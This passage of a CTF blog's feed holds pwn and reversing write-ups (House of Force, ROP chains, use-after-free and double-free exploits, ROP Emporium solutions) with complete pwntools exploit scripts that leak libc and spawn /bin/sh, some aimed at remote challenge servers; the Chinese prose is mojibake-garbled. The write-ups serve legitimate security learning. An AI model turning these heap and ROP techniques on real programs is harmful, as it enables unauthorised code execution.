sla(&#39;id&#39;,str(id))context.log_level = &#39;debug&#39;sizelist = 0x804B0A0heaplist = 0x804B120heapbase = name(&#39;a&#39; * (0x40-1) + &#39;b&#39;)top = heapbase + 0xd8info_addr(&#39;top&#39;,top)org(&#39;b&#39;*0x40,p32(0xffffffff)) #chang top chunk sizesize = heaplist - top - 0x10add(size,&#39;\n&#39;)add(0x18,&#39;\n&#39;)payload = p32(0) + p32(elf.got[&#39;free&#39;]) + p32(elf.got[&#39;atoi&#39;])  +p32(0x804B128+4+4) + &#39;/bin/sh\x00&#39;edit(1,payload + &#39;\n&#39;)puts_plt = elf.plt[&#39;puts&#39;]edit(1,p32(puts_plt) + &#39;\n&#39;)free(2)io.recv(1)io.recv(1)atoi = uu32(r(4))info_addr(&#39;atoi&#39;,atoi)libc = LibcSearcher(&#39;atoi&#39;,atoi)libc_base = atoi - libc.dump(&#39;atoi&#39;)system = libc_base + libc.dump(&#39;system&#39;)info_addr(&#39;libc_base&#39;,libc_base)edit(1,p32(system) + &#39;\n&#39;)free(3)itr()</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;House-of-Force&quot;&gt;&lt;a href=&quot;#House-of-Force&quot; class=&quot;headerlink&quot; title=&quot;House of Force&quot;&gt;&lt;/a&gt;House of Force&lt;/h1&gt;&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot;
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="Houseç³»åˆ—" scheme="http://chumen77.xyz/tags/House%E7%B3%BB%E5%88%97/"/>
    
      <category term="heap" scheme="http://chumen77.xyz/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>DASCTFå®‰æ’æœˆèµ›(4th)</title>
    <link href="http://chumen77.xyz/2020/04/25/DASCTF%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B/"/>
    <id>http://chumen77.xyz/2020/04/25/DASCTFå®‰æ’æœˆèµ›/</id>
    <published>2020-04-25T13:48:11.966Z</published>
    <updated>2020-06-27T16:24:40.675Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DASCTFå®‰æ’æœˆèµ›-pwn"><a href="#DASCTFå®‰æ’æœˆèµ›-pwn" class="headerlink" title="DASCTFå®‰æ’æœˆèµ›-pwn"></a>DASCTFå®‰æ’æœˆèµ›-pwn</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å¼€èµ›äº†ï¼Œæœ‰ç‚¹äº‹æƒ…æ²¡æ‰“ï¼Œæ™šä¸Šå¤ç°äº†ä¸€ä¸‹ã€‚</p><h2 id="echo-server"><a href="#echo-server" class="headerlink" title="echo-server"></a>echo-server</h2><pre><code class="python">[*] &#39;/ctf/work/ahys/echo server/test&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><p>ç¨‹åºå¾ˆç®€å•ï¼Œç»å…¸æ ˆæº¢å‡ºï¼Œropåˆ©ç”¨å³å¯ã€‚<br>ä½†æ˜¯å› ä¸ºæ˜¯64ä½çš„ï¼Œå¹¶ä¸”æ˜¯glibc2.27ï¼Œå‘ç°åœ¨åšçš„æ—¶å€™æ„é€ ropé“¾æ€»æ˜¯ä¼šcurshï¼Œ<br>è°ƒè¯•å‘ç°ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/jfAEUD.png" srcset="/img/loading.gif" alt><br>å‘ç°è¿™æ®µæ±‡ç¼–ç›´æ¥ä¼šè®©ç¨‹åºcurshï¼Œæƒ³èµ·æ¥exå¸ˆå‚…ä¸€ç¯‡æ–‡ç« åˆ†æè¿‡ï¼Œ64ä½ç¨‹åºropåˆ°systemæ‹¿shellçš„æ—¶å€™ä¹Ÿä¼šè¿™æ ·ã€‚ä½†æ˜¯å¾ˆå¥‡æ€ªè¿™ä¸ªä¹Ÿå‡ºç°äº†ï¼Œç´¢æ€§å°è¯•ä¸€æ³¢ã€‚<br>è§£å†³åŠæ³•ï¼šè¿˜æ˜¯åŠ ä¸ªretï¼Œè®©æ ˆå¯¹å…¶å³å¯ã€‚</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *local_file  = &#39;./test&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc-2.27.so&#39;remote_libc = &#39;./libc.so.6&#39;debug = 1if debug:    io = process(local_file)    libc = ELF(local_libc)else:    # io = remote(&#39;node3.buuoj.cn&#39;,25390)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.log_level = &#39;debug&#39;context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]#,&#39;neww&#39;s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def dbg():    # gdb.attach(proc.pidof(io)[0],gdbscript=&quot;b main&quot;)    gdb.attach(io)    pause()pop_rdi = 0x0000000000400823# : pop rdi ; retoffset = 136start = 0x4005C0ret = 0x0400768sla(&#39;how long is your name:&#39;,&#39;500&#39;)payload = &#39;\x00&#39; * offset + flat([ret,pop_rdi,elf.got[&#39;read&#39;],elf.plt[&#39;printf&#39;],start])# dbg()sla(&#39;s you name?&#39;,payload)ru(&#39;hello &#39;)read = uu64(r(6))info_addr(&#39;printf&#39;,read)libc_base = read - libc.symbols[&#39;read&#39;]info_addr(&#39;libc_base&#39;,libc_base)binsh = libc_base  + libc.search(&quot;/bin/sh&quot;).next()system = libc_base + libc.sym[&#39;system&#39;]sla(&#39;how long is your name: &#39;,&#39;500&#39;)payload = &#39;\x00&#39; * offset + flat([ret,pop_rdi,binsh,system])# rec = 0x4f322 + libc_base# dbg()sla(&#39;s you name?&#39;,payload)itr()</code></pre><h2 id="å…¥é—¨reverse"><a href="#å…¥é—¨reverse" class="headerlink" title="å…¥é—¨reverse"></a>å…¥é—¨reverse</h2><pre><code class="python">s = &#39;akhb~chdaZrdaZudqduvdZvvv|&#39;flag = &#39;&#39;for i in range(26):    flag += chr((ord(s[i]) - 1) ^ 6)print(flag)</code></pre><h2 id="Encrypts"><a href="#Encrypts" class="headerlink" title="Encrypts"></a>Encrypts</h2><p>ç›´æ¥çˆ†ç ´äº†ã€‚</p><pre><code class="python">s = [38,44,33,39,59,35,34,115,117,114,113,33,36,117,118,119,35,120,38,114,117,113,38,34,113,114,117,114,36,112,115,118,121,112,35,37,121,61]for i in range(128):    flag = &#39;&#39;    for j in range(38):        flag += chr(s[j] ^ i)    if flag[:4] == &#39;flag&#39;:        print(flag)</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;DASCTFå®‰æ’æœˆèµ›-pwn&quot;&gt;&lt;a href=&quot;#DASCTFå®‰æ’æœˆèµ›-pwn&quot; class=&quot;headerlink&quot; title=&quot;DASCTFå®‰æ’æœˆèµ›-pwn&quot;&gt;&lt;/a&gt;DASCTFå®‰æ’æœˆèµ›-pwn&lt;/h1&gt;&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot;
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="re" scheme="http://chumen77.xyz/tags/re/"/>
    
      <category term="rop" scheme="http://chumen77.xyz/tags/rop/"/>
    
      <category term="uaf" scheme="http://chumen77.xyz/tags/uaf/"/>
    
  </entry>
  
  <entry>
    <title>uafå’Œdouble free</title>
    <link href="http://chumen77.xyz/2020/04/25/uaf%E5%92%8Cdouble%20free/"/>
    <id>http://chumen77.xyz/2020/04/25/uafå’Œdouble free/</id>
    <published>2020-04-25T03:40:09.709Z</published>
    <updated>2020-06-27T16:24:30.624Z</updated>
    
    <content type="html"><![CDATA[<h1 id="uafå’Œdouble-free"><a href="#uafå’Œdouble-free" class="headerlink" title="uafå’Œdouble free"></a>uafå’Œdouble free</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ€è¿‘å¼€å§‹æ‰“ç®—å…¥é—¨å †ï¼Œç®€å•è®°å½•å‡ é“ç›¸å…³çš„é¢˜ã€‚</p><h2 id="hitcontraining-uaf"><a href="#hitcontraining-uaf" class="headerlink" title="hitcontraining-uaf"></a>hitcontraining-uaf</h2><p>é¢˜ç›®è¾ƒä¸ºç®€å•å­˜åœ¨åé—¨å‡½æ•°ï¼Œåˆ©ç”¨uafæ¼æ´æ”»å‡»å³å¯ã€‚</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *local_file  = &#39;./hacknote&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;../libc.so.6&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,27892)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.log_level = &#39;debug&#39;context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]#,&#39;neww&#39;s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def dbg():    # gdb.attach(proc.pidof(io)[0],gdbscript=&quot;b main&quot;)    gdb.attach(io)    pause()def add(size,content):    sl(&#39;1&#39;)    ru(&#39;Note size &#39;)    sl(str(size))    ru(&#39;Content :&#39;)    sl(str(content))def dele(index):    sl(&#39;2&#39;)    sl(str(index))def show(index):    sl(&#39;3&#39;)    sl(str(index))ru(&#39;Your choice :&#39;)add(16,&#39;aaaa&#39;)ru(&#39;Your choice :&#39;)add(16,&#39;bbbb&#39;)ru(&#39;Your choice :&#39;)dele(0)ru(&#39;Your choice :&#39;)dele(1)ru(&#39;Your choice :&#39;)add(8,p32(elf.symbols[&#39;magic&#39;]))ru(&#39;Your choice :&#39;)show(0)itr()</code></pre><h2 id="ACTF-2019-babyheap"><a href="#ACTF-2019-babyheap" class="headerlink" title="ACTF_2019_babyheap"></a><code>ACTF_2019_babyheap</code></h2><p>é¢˜ç›®æœ‰systemå‡½æ•°ï¼Œå¹¶ä¸”ä¹Ÿæœ‰<code>/bin/sh\x00</code> ï¼Œå½“æ—¶åœ¨æ„é€ è¿™ä¸ª<code>/bin/sh\x00</code>çš„å­—ç¬¦ä¸²æŒ‡é’ˆçš„æ—¶å€™è´¹äº†ä¸€ç‚¹åŠ²ï¼Œç»“æœå‘ç°elfæœ‰è¿™ä¸ªå­—ç¬¦ä¸²ã€‚ç„¶åå°±å¾ˆç®€å•äº†ï¼Œæ§åˆ¶å¥½å‚æ•°å³å¯ã€‚è¿˜æ˜¯uafæ¼æ´è¿›è¡Œæ”»å‡»ã€‚</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *local_file  = &#39;./ACTF_2019_babyheap&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;../libc.so.6&#39;debug = 1 if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,27341)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.log_level = &#39;debug&#39;context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]#,&#39;neww&#39;s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def dbg():    # gdb.attach(proc.pidof(io)[0],gdbscript=&quot;b main&quot;)    gdb.attach(io)    pause()def add(size,content):    sla(&#39;Your choice: &#39;,&#39;1&#39;)    sla(&#39;size: \n&#39;,str(size))    sa(&#39;content: \n&#39;,str(content)) def dele(index):    sla(&#39;: &#39;,&#39;2&#39;)    sla(&#39;index: \n&#39;,str(index))def show(index):    sla(&#39;: &#39;,&#39;3&#39;)    sla(&#39;index: \n&#39;,str(index))add(32,&#39;aaaaaaaa&#39;) #0add(32,&#39;bbbbbbbb&#39;) #1dele(0)dele(1)binsh = 0x602010add(16,flat(binsh,elf.plt[&#39;system&#39;]))# dbg()show(0)itr()</code></pre><h2 id="actf-2019-message"><a href="#actf-2019-message" class="headerlink" title="actf-2019-message"></a>actf-2019-message</h2><p>Double freeï¼Œè¿ç§»åˆ°ä¼ªé€ çš„å †å—ï¼Œæ³¨æ„æ§åˆ¶å¥½ä¼ªé€ å †å—çš„sizeè·Ÿfastbinçš„å¯¹åº”ã€‚<br>æ”¹<code>__free_hook</code>ä¸ºsystemå³å¯ã€‚<code>__free_hook</code>çš„å‚æ•°æ­£å¥½æ˜¯å †å—çš„dateï¼Œè¾ƒå¥½æ§åˆ¶ã€‚<br>ï¼ˆbuuç»™çš„å¤ç°ç¯å¢ƒæ˜¯18çš„ï¼Œæœ‰äº†tcacheæœºåˆ¶ï¼Œä½†æ˜¯æœ¬äººè¿˜ä¸å¤ªç†Ÿæ‚‰ï¼Œåªæ˜¯çŸ¥é“ä¸æ£€æŸ¥sizeæ˜¯å¦å¯¹åº”äº†ï¼Œåœ¨16ä¸Šåšçš„ï¼Œç„¶åå°±è°ƒè¯•æ”¹äº†æ”¹è„šæœ¬ï¼Œæ‰“é€šäº†buuçš„å¤ç°ç¯å¢ƒã€‚ä¸‹é¢çš„expä¹Ÿæ˜¯18çš„ã€‚ï¼‰</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *local_file  = &#39;./ACTF_2019_message&#39;# local_libc  = &#39;/lib/x86_64-linux-gnu/libc-2.27.so&#39;# remote_libc = local_libc # &#39;../libc.so.6&#39;debug = 1if debug:    io = process(local_file)    # libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,25390)    # libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.log_level = &#39;debug&#39;context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]#,&#39;neww&#39;s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def dbg():    # gdb.attach(proc.pidof(io)[0],gdbscript=&quot;b main&quot;)    gdb.attach(io)    pause()def add(length,contend) :    sla(&#39;choice: &#39;,&#39;1&#39;)    sla(&#39;length of message:\n&#39;,str(length))    sa(&#39;message:\n&#39;,str(contend))def free(index):    sla(&#39;choice: &#39;,&#39;2&#39;)    sla(&#39;to delete:\n&#39;,str(index))def edit(index,contend):    sla(&#39;choice: &#39;,&#39;3&#39;)    sla(&#39;to edit:\n&#39;,str(index))    sa(&#39;the message:\n&#39;,str(contend))def show(index):    sla(&#39;choice: &#39;,&#39;4&#39;)    sla(&#39;to display:\n&#39;,str(index))add(0x30,&#39;a&#39;) #0add(0x20,&#39;a&#39;) #1add(0x20,&#39;a&#39;) #2free(1)free(2)free(1)add(0x20,p64(0x602068))add(0x20,&#39;aaaaaaaa&#39;)add(0x20,&#39;aaaaaaaa&#39;)contend = p64(elf.got[&#39;puts&#39;])# + p64(0x30) + p64(elf.got[&#39;puts&#39;])add(0x20,contend)show(0)ru(&#39; message: &#39;)puts = uu64(r(6))libc_base = puts - libc.symbols[&#39;puts&#39;]free_hook = libc_base + libc.symbols[&#39;__free_hook&#39;]print(&#39;puts&#39; + hex(puts))print(&#39;libc_base&#39; + hex(libc_base))system = libc_base + libc.symbols[&#39;system&#39;]contend = p64(free_hook)dbg()edit(6,contend)# dbg()contend = p64(system)edit(0,contend)# dbg()add(0x8,&#39;/bin/sh\x00&#39;)free(7)itr()</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;uafå’Œdouble-free&quot;&gt;&lt;a href=&quot;#uafå’Œdouble-free&quot; class=&quot;headerlink&quot; title=&quot;uafå’Œdouble free&quot;&gt;&lt;/a&gt;uafå’Œdouble free&lt;/h1&gt;&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="å­¦ä¹ è®°å½•" scheme="http://chumen77.xyz/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>pwntoolsçš„gdb.attach</title>
    <link href="http://chumen77.xyz/2020/04/20/pwntools%E7%9A%84gdb.attach/"/>
    <id>http://chumen77.xyz/2020/04/20/pwntoolsçš„gdb.attach/</id>
    <published>2020-04-20T04:21:15.070Z</published>
    <updated>2020-07-16T13:15:04.024Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pwntoolsçš„gdb-attach"><a href="#pwntoolsçš„gdb-attach" class="headerlink" title="pwntoolsçš„gdb.attach"></a>pwntoolsçš„gdb.attach</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ€è¿‘åœ¨å°è¯•å­¦ç€æ›´å¿«çš„è°ƒè¯•expï¼Œå¾ˆæ—©å°±äº†è§£åˆ°è¿™ä¸ªgdb.attachï¼Œä½†æ˜¯æœ¬äººæ˜¯sshè¿ä¸Šå»çš„ï¼Œæ ¹æœ¬ç”¨ä¸äº†ã€‚ç„¶åå°è¯•tmuxè¿™ä¸ªç¥å™¨ï¼Œæ¥å®ç°gdb.attachã€‚æˆåŠŸä»¥åå‘ç°ä¸€ä¸ªä¸å¥½çš„ç‚¹ï¼Œpwntools gdb.attachä¸Šçš„gdbè°ƒè¯•ä¸­ï¼Œå¾ˆå¤šå‡½æ•°æ˜¯æ²¡æœ‰ç¬¦å·è¡¨çš„ï¼Œè°ƒè¯•èµ·æ¥åè€Œéš¾åº¦å¢åŠ ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/QGWqDH.png" srcset="/img/loading.gif" alt><br>è‡ªå·±æ‰‹åŠ¨gdb.attachä¸Šå»ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/acimnJ.png" srcset="/img/loading.gif" alt><br>ç„¶åå‘ç°è°·æ­Œä¹Ÿè°·æ­Œä¸å‡ºæ¥ï¼Œå°±æ¥æŠ˜è…¾æºç äº†ã€‚<br><strong>ç‰ˆæœ¬å· ï¼špwntools (4.0.1)</strong></p><h2 id="æ”¹å–„"><a href="#æ”¹å–„" class="headerlink" title="æ”¹å–„"></a>æ”¹å–„</h2><p>å› ä¸ºæ­£å¸¸æœ¬äººéƒ½æ˜¯</p><pre><code>chumen77@chumen-77:~$ gdb at pid</code></pre><p>è¿™æ ·æ¥è¿›è¡Œattachã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/JxHuUC.png" srcset="/img/loading.gif" alt><br>å‘ç°ç”¨pwntoolsæ—¶å€™ï¼Œå®ƒè¿›è¡Œçš„å‘½ä»¤æ˜¯è¿™æ ·çš„ï¼Œç„¶åæ€è·¯å°±æ¥äº†æ‰¾åˆ°ç›¸å…³æºç ï¼Œæ”¹ä¸€ä¸‹å°±å¥½äº†ã€‚</p><h3 id="æ‰¾å…³é”®å¤„"><a href="#æ‰¾å…³é”®å¤„" class="headerlink" title="æ‰¾å…³é”®å¤„"></a>æ‰¾å…³é”®å¤„</h3><pre><code>/running in new terminal</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/8T9BqG.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/BlYHnW.png" srcset="/img/loading.gif" alt><br>åˆ é™¤2è¡Œå’Œä¿®æ”¹ä¸€è¡Œä»£ç ï¼ˆ<code>-q æ”¹æˆ at</code>ï¼‰å³å¯ã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/XUD2ZW.png" srcset="/img/loading.gif" alt><br>å‘ç°å·²ç»å¯ä»¥äº†ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;pwntoolsçš„gdb-attach&quot;&gt;&lt;a href=&quot;#pwntoolsçš„gdb-attach&quot; class=&quot;headerlink&quot; title=&quot;pwntoolsçš„gdb.attach&quot;&gt;&lt;/a&gt;pwntoolsçš„gdb.attach&lt;/h1&gt;&lt;h2 i
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="æ‚é¡¹" scheme="http://chumen77.xyz/tags/%E6%9D%82%E9%A1%B9/"/>
    
  </entry>
  
  <entry>
    <title>Ropemporium é€šå…³è®°å½•</title>
    <link href="http://chumen77.xyz/2020/04/13/Ropemporium%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"/>
    <id>http://chumen77.xyz/2020/04/13/Ropemporiumé€šå…³è®°å½•/</id>
    <published>2020-04-13T04:32:06.614Z</published>
    <updated>2020-08-02T15:30:06.189Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Ropemporium-é€šå…³è®°å½•"><a href="#Ropemporium-é€šå…³è®°å½•" class="headerlink" title="Ropemporium é€šå…³è®°å½•"></a>Ropemporium é€šå…³è®°å½•</h1><h2 id="ret2win"><a href="#ret2win" class="headerlink" title="ret2win"></a>ret2win</h2><h3 id="ä¿æŠ¤å’Œarch"><a href="#ä¿æŠ¤å’Œarch" class="headerlink" title="ä¿æŠ¤å’Œarch"></a>ä¿æŠ¤å’Œarch</h3><pre><code>    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><h3 id="idaåˆ†æ"><a href="#idaåˆ†æ" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><p>é¢˜ç›®ç»™äº†æç¤ºï¼Œ32çš„bufå´å¯ä»¥å¡«å……50ä¸ªå­—èŠ‚ã€‚å¹¶ä¸”æ¥å—ç”¨çš„æ˜¯fgetsï¼Œè¿™ä¸ªå‡½æ•°ä¸ç”¨æ‹…å¿ƒç©ºå­—èŠ‚ã€‚</p><pre><code class="c">int ret2win(){  printf(&quot;Thank you! Here&#39;s your flag:&quot;);  return system(&quot;/bin/cat flag.txt&quot;);}</code></pre><p>å¹¶ä¸”å­˜åœ¨æ¼æ´å‡½æ•°ã€‚</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><h4 id="32ä½"><a href="#32ä½" class="headerlink" title="32ä½"></a>32ä½</h4><pre><code class="python">from pwn import *context.arch = &#39;i386&#39;io = process(&#39;./ret2win32&#39;)io.recvuntil(&#39;&gt;&#39;)payload = &#39;a&#39; * 44 + p32(0x08048659)io.sendline(payload)io.interactive()</code></pre><h4 id="64ä½"><a href="#64ä½" class="headerlink" title="64ä½"></a>64ä½</h4><pre><code class="python">from pwn import *context.arch = &#39;amd64&#39;io = process(&#39;./ret2win&#39;)io.recvuntil(&#39;&gt;&#39;)payload = &#39;a&#39; * 40 + p64(0x00000400811)io.sendline(payload)io.interactive()</code></pre><h2 id="split"><a href="#split" class="headerlink" title="split"></a>split</h2><h3 id="ä¿æŠ¤å’Œarch-1"><a href="#ä¿æŠ¤å’Œarch-1" class="headerlink" title="ä¿æŠ¤å’Œarch"></a>ä¿æŠ¤å’Œarch</h3><pre><code>    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><h3 id="idaåˆ†æ-1"><a href="#idaåˆ†æ-1" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><pre><code class="c">int usefulFunction(){  return system(&quot;/bin/ls&quot;);}</code></pre><p>åé—¨å‡½æ•°å˜æˆäº†è¿™æ ·ï¼Œä½†æ˜¯å¯ä»¥çœ‹åˆ°æœ‰cat flagçš„å­—ç¬¦ä¸²ã€‚è¿™æ ·åªéœ€è¦æ§åˆ¶systemçš„å‚æ•°å³å¯ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/aPvOxL.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/qQOFlI.png" srcset="/img/loading.gif" alt></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><h4 id="32ä½ï¼š"><a href="#32ä½ï¼š" class="headerlink" title="32ä½ï¼š"></a>32ä½ï¼š</h4><pre><code class="python">from pwn import *context.arch = &#39;i386&#39;io = process(&#39;./split32&#39;)key = 0x0804A030 # /bin/cat flag.txt&#39;io.recvuntil(&#39;&gt;&#39;)offset = 44payload = &#39;a&#39; * offset + p32(0x08048657) + p32(0x0804A030)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.interactive()</code></pre><h4 id="64ä½ï¼š"><a href="#64ä½ï¼š" class="headerlink" title="64ä½ï¼š"></a>64ä½ï¼š</h4><pre><code class="python">from pwn import *context.arch = &#39;amd64&#39;io = process(&#39;./split&#39;)io.recvuntil(&#39;&gt;&#39;)key = 0x00601060 # /bin/cat flag.txt&#39;offset = 40pop_rdi_ret = 0x0000000000400883payload = &#39;a&#39; * offset + p64(pop_rdi_ret) + p64(key) + p64(0x00000400810) io.sendline(payload)io.interactive()</code></pre><h2 id="callme"><a href="#callme" class="headerlink" title="callme"></a>callme</h2><h3 id="idaåˆ†æ-2"><a href="#idaåˆ†æ-2" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><pre><code class="c">void __noreturn usefulFunction(){  callme_three(4LL, 5LL, 6LL);  callme_two(4LL, 5LL, 6LL);  callme_one(4LL, 5LL, 6LL);  exit(1);}</code></pre><p>è¿™ä¸ªæ˜¯å…³é”®å‡½æ•°ï¼Œä½†æ˜¯å…¶æ˜¯ç”¨åˆ°äº†ç»™çš„soæ–‡ä»¶ï¼Œç„¶åidaæ¥åˆ†æsoæ–‡ä»¶ã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/FgKhVy.png" srcset="/img/loading.gif" alt><br>æ‰¾åˆ°ä»¥åå‘ç°åº”è¯¥æ˜¯æŒ‰ç…§é¡ºåºè°ƒç”¨<code>callme-oneï¼Œcallme-twoï¼Œcallme-three</code>éœ€è¦æ³¨æ„å…¶å‚æ•°éƒ½è¦æ˜¯1ï¼Œ2ï¼Œ3.å½“åˆç¨‹åºä¸­ç»™çš„æ˜¯4ï¼Œ5ï¼Œ6 éœ€è¦æƒ³åŠæ³•æ¥æ¢æ‰è¿™ä¸ªå‚æ•°ã€‚</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><h4 id="32ä½ï¼š-1"><a href="#32ä½ï¼š-1" class="headerlink" title="32ä½ï¼š"></a>32ä½ï¼š</h4><pre><code class="python">from pwn import *context.arch = &#39;i386&#39;io = process(&#39;./callme32&#39;)io.recvuntil(&#39;&gt;&#39;)offset = 44callme_one = 0x080485C0callme_two = 0x08048620callme_three = 0x080485B0pop3_ret = 0x080488a9payload = &#39;a&#39; * offset + p32(callme_one) + p32(pop3_ret) + p32(1) + p32(2) + p32(3)payload += p32(callme_two) + p32(pop3_ret) + p32(1) + p32(2) + p32(3)payload += p32(callme_three) + p32(0xdeadbeef) + p32(1) + p32(2) + p32(3)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.interactive()</code></pre><p>å…¶ä¸­<code>pop3_ret</code> æ˜¯ç”¨æ¥ä¿æŒæ ˆå¹³è¡¡çš„ï¼Œä¸”ç«™çš„ä½ç½®å‡½æ•°çš„è¿”å›åœ°å€ã€‚è¿˜æœ‰éœ€è¦æ³¨æ„çš„é—®é¢˜æ˜¯ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/9PV8oL.png" srcset="/img/loading.gif" alt><br>æ³¨æ„å¡«å……ä»¥åçš„è¿”å›åœ°å€å¡«çš„æ—¶å€™ï¼Œé€šå¸¸å¡«çš„æ˜¯ä»£ç 